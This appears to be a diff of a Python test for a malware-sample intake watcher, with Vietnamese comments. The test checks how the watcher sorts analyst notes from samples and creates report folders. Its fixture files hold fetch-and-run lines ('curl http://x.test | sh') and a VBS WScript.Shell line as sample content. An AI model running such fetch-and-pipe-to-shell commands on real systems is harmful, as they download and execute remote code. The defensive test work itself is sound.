@@ -18,14 +18,15 @@ f4 = w(os.path.join(inbox, 'U2', 'tool.sha256'), b'#!/bin/sh\necho x\n')   # tê
 sc = w(os.path.join(inbox, 'U1_extracted', 'a', 'install.sh'), ('#!/bin/sh\n# ' + h + '\necho x\n').encode())   # script thật có hash payload: vẫn là mẫu
 t1 = w(os.path.join(inbox, 'U2', 'k.txt'), b'curl http://x.test | sh\n'); t2 = w(os.path.join(inbox, 'U2', 'k.log'), b'log\n')   # hai file text cạnh nhau: vẫn là mẫu
 b = w(os.path.join(inbox, 'U3', 'r.tar.gz'), b'\x1f\x8b\x08')
-d1 = w(os.path.join(inbox, 'U1_extracted', 'a', 's.bin.txt'), b'#!/bin/sh\ncurl http://x.test/p | sh\n')   # tên giống ghi chú nhưng nội dung là script: vẫn là mẫu
+d1 = w(os.path.join(inbox, 'U1_extracted', 'a', 's.bin.txt'), b'#!/bin/sh\ncurl http://x.test/p | sh\n')
+d2 = w(os.path.join(inbox, 'U1_extracted', 'a', 's.log'), b'Set o = CreateObject("WScript.Shell")\n')   # VBS mang tên ghi chú: là mẫu   # tên giống ghi chú nhưng nội dung là script: vẫn là mẫu
 ws = os.path.join(T, 'Report_IN', '.cases'); os.makedirs(ws); os.chdir(ws)
 try:
     watch.ALIAS = ''
     got = set(watch.samples(inbox)); assert a in got and s in got, got   # không cấu hình hậu tố: quét cả hai
     watch.ALIAS = '_extracted'
     got = set(watch.samples(inbox)); assert a not in got and s in got and b in got, got   # có U1_extracted thì bỏ U1
-    assert all(watch.note_of(p) for p in (n1, n2, n3)) and not any(watch.note_of(p) for p in (s, sc, t1, t2, b, d1, f4))
+    assert all(watch.note_of(p) for p in (n1, n2, n3)) and not any(watch.note_of(p) for p in (s, sc, t1, t2, b, d1, d2, f4))
     root = watch.report_root(inbox, 'IN'); assert root == os.path.join(T, 'Report_IN') and watch.report_root(inbox, None) is None
     assert watch.report_root(inbox, os.path.join(T, 'khac')) == os.path.join(T, 'khac')
     assert watch.stem('x.tar.gz') == 'x' and watch.stem('a.bin') == 'a.bin'
@@ -45,7 +46,7 @@ try:
     made = lambda: sorted(x for x in os.listdir(ws) if os.path.exists(os.path.join(ws, x, 'work', 'watch.json')))
     watch.MAXN = 2; watch.ingest(inbox, 'IN'); assert len(made()) == 2, made()
     watch.MAXN = 20; watch.ingest(inbox, 'IN'); m = made()
-    assert len(m) == 6 and sorted(x.split('_')[0] for x in m) == ['install', 'k', 'k', 'r', 's', 'tool'], m   # s.bin đã có báo cáo: không làm lại
+    assert len(m) == 7 and sorted(x.split('_')[0] for x in m) == ['install', 'k', 'k', 'r', 's', 's', 'tool'], m   # s.bin đã có báo cáo: không làm lại
     watch._NOTED.clear(); watch.ingest(inbox, 'IN')   # khởi động lại watcher: không ghi lặp vào log
     L = open(os.path.join(ws, watch.NOTES_LOG), encoding='utf-8').read().splitlines()   # ghi chú bị bỏ qua được ghi lại, mỗi file một lần
     assert sorted(x.split('\t')[1] for x in L) == sorted([n1, n2, n3]) and 'nhắc sha256 của s.bin' in '\n'.join(L), L
